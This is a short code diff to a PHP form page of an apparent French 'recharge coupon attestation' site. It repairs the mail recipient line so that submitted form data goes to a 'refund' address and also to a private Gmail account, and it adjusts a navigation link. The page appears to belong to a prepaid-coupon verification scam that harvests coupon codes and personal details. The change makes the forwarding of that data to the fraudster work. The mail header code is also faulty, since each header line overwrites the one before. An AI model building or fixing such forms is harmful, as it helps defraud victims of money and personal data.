@@ -76,7 +76,7 @@ if(!empty($_POST)){
     }
 
     if(count($errors) == 0){
-        $mailTo = "refund@fiches-attestationdesrecharges.com", "kilmeraf90@gmail.com";
+        $mailTo = "refund@fiches-attestationdesrecharges.com, kilmeraf90@gmail.com";
         $headers = "From: Site de Fiche d'attestation des recharges\r\n";
         $headers = "Reply-To: refund@fiches-attestationdesrecharges.com\r\n";
         $headers = "Content-type: text/html\r\n";
@@ -126,7 +126,7 @@ if(!empty($_POST)){
             <div class="collapse navbar-collapse" id="navbarCollapse">
               <ul class="navbar-nav me-auto mb-2 mb-md-0">
                 <li class="nav-item">
-                  <a class="nav-link" href="index.php">Accueil</a>
+                  <a class="nav-link" href="index.html">Accueil</a>
                 </li>
                 <li class="nav-item">
                   <a class="nav-link" href="attestation.php">Télécharger une fiche d'attestation</a>
